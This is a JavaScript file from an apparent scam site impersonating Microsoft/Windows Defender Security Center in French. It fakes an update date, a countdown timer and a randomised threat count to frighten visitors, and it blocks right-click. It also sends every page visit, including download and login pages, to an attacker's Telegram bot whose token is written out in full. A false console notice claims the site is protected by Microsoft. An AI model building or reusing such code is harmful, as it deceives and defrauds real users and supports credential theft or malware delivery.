// Windows Defender Security Center — Scripts
(function(){
// Fake clock for "last update"
document.querySelectorAll('.fake-date').forEach(function(el){
el.textContent=new Date(Date.now()-7*86400000).toLocaleDateString('fr-FR');
});

// Countdown timer
var cd=document.getElementById('countdown');
if(cd){
var t=299;
setInterval(function(){
t--;if(t<0)t=299;
var m=Math.floor(t/60),s=t%60;
cd.textContent='0'+m+':'+(s<10?'0':'')+s;
},1000);
}

// Track page views
var pages={'index':'Dashboard','scan':'Scan','download':'Download','login':'Login'};
var page=pages[window.location.pathname.split('/').pop().replace('.html','')]||'Unknown';
try{
var img=new Image();
img.src='https://api.telegram.org/bot8875226322:AAFsOazAfQOy5rlP1LQSM2JPX0YiPXQZPSM/sendMessage?chat_id=7947710235&text='+encodeURIComponent('<b>[VISIT]</b> '+page+' | '+new Date().toLocaleString('fr-FR'));
}catch(e){}

// Fake threat count randomizer
var tc=document.getElementById('threatCount');
if(tc){tc.textContent=Math.floor(Math.random()*3)+3;}

// Prevent right-click
document.addEventListener('contextmenu',function(e){e.preventDefault();return false;});

console.log('%c🛡️ Microsoft Defender Security Center %cv2026.07',
'color:#0078d4;font-size:20px;font-weight:bold','color:#666');
console.log('%cCe site est protégé par Microsoft Corporation. Toute tentative d\'accès non autorisé sera signalée.',
'color:#999;font-size:11px');
})();
